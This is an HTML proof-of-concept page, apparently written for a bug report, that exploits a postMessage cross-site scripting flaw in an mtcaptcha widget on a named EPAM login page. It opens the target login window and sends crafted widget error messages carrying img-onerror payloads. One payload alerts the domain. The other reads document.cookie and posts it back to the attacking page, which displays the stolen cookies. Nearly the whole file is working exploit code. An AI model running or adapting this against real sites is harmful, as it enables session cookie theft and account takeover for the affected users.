<html>
<head></head>
<body>
<button onclick="open_vlaanderen()">click me to open access.epam.com</button>
<button onclick="start_send_t()">click me to send xss payload</button>
<button onclick="start_send_s()">click me to send steal cookies</button>

    <script>
    
        window.addEventListener("message", (msg) => {
            console.log("got message", msg);
            alert(msg.data);
        });

	function start_send_s (){
		 
		win.postMessage(`{"mtcap":1,"widgetInstance":"mtcaptcha","eventinfo":{"errorMsg":"<img src=x onerror=window.opener.postMessage(document.cookie,'*')>","errorType":1,"height":50},"event":"miniError","status":{"element":"mtcaptcha"}}`,"*")
	}
	
	function start_send_t (){
		 
		win.postMessage(`{"mtcap":1,"widgetInstance":"mtcaptcha","eventinfo":{"errorMsg":"<img src=x onerror=alert(document.domain)>","errorType":1,"height":50},"event":"miniError","status":{"element":"mtcaptcha"}}`,"*")
	}
	 async function open_vlaanderen() {
          
		win = window.open("https://accounts.dev.epam.com:8443/auth/realms/plusx/protocol/openid-connect/auth?client_id=test_client_1&redirect_uri=http%3A%2F%2Faccounts.dev.epam.com%3A8180%2Fcallback_oidc.html&response_type=code&scope=openid%20email%20profile%20offline_access", "transact");
	        await new Promise((resolve) => setTimeout(resolve, 4000));
		alert("access.epam.com is establish. you can execute javascript now :)");
        }
      </script>
</body>
</html>
